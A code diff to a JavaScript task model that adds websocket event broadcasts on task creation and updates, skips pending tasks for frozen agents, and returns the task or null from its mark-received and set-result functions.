@@ -56,13 +56,14 @@ const Task = mongoose.model('task', taskSchema);
 export default Task;
 
 /**
- * Create a new task.
+ * Create a new task. Broadcasts "new_task" ws on success.
  * @param {string} owner - The task owner (username of the user that creates the task)
  * @param {object} data - The request body received.
  * @return {object} The task created.
  */
 export const createTask = async (owner, data) => {
 
+  const socketServer = global.socketServer;
   const taskID = crypto.randomBytes(8).toString('hex').trim();
   let agentID = data.agentID.toString().trim();
   const agent = await getAgent(agentID); // will throw an error in not valid.
@@ -76,6 +77,7 @@ export const createTask = async (owner, data) => {
     dateCreated: Date.now()
   });
   await task.save();
+  socketServer.emit("new_task", task);
   return task;
 };
 
@@ -97,6 +99,10 @@ export const getTasks = async (agentID) => {
  * @return {object} Pending tasks. 
  */
 export const getPendingTasks = async (agentID) => {
+  
+  const agent = await getAgent(agentID);
+  if (agent.frozen)
+    return [];
   return await Task.find({agentID: agentID.toString(), received: false}, ["uid", "taskType", "data"]);
 };
 
@@ -117,28 +123,39 @@ export const getAllTasks = async () => {
 };
 
 /**
- * Mark a task as received.
+ * Mark a task as received. Emits the "update_task" ws event on success.
  * @param {string} taskID - The ID of the task.
- * @return {object} The query result.
+ * @return {object} The target task, null if invalid.
  */
 export const markReceived = async (taskID) => {
   
-  const data = await Task.updateOne({uid: taskID.toString()}, {received: true, dateReceived: Date.now()});
-  if (data.modifiedCount < 1)
-    throw new Error("Invalid task!");
-  return data;
+  const socketServer = global.socketServer;
+  const task = await Task.findOne({uid: taskID.toString()});
+  if (!task)
+    return null;
+  task.received = true;
+  task.dateReceived = Date.now();
+  await task.save();
+  socketServer.emit("update_task", task);
+  return task;
 };
 
 /**
- * Set the result of a task and mark it as complete.
+ * Set the result of a task and mark it as complete. Emits the "update_task" event on success.
  * @param {string} taskID - The ID of the task.
  * @param {string} result - The result of the task.
- * @return {object} The query result.
+ * @return {object} The updated task, null if not valid or task is already completed.
  */
 export const setResult = async (taskID, result) => {
 
-  const data = await Task.updateOne({uid: taskID.toString()}, {completed: true, dateCompleted: Date.now(), result: result.toString()});
-  if (data.modifiedCount < 1)
-    throw new Error("Invalid task!");
-  return data;
+  const socketServer = global.socketServer;
+  const task = await Task.findOne({uid: taskID.toString()});
+  if (!(task && task.completed === false))
+    return null;
+  task.completed = true;
+  task.dateCompleted = Date.now();
+  task.result = result.toString();
+  await task.save();
+  socketServer.emit("update_task", task);
+  return task;
 };
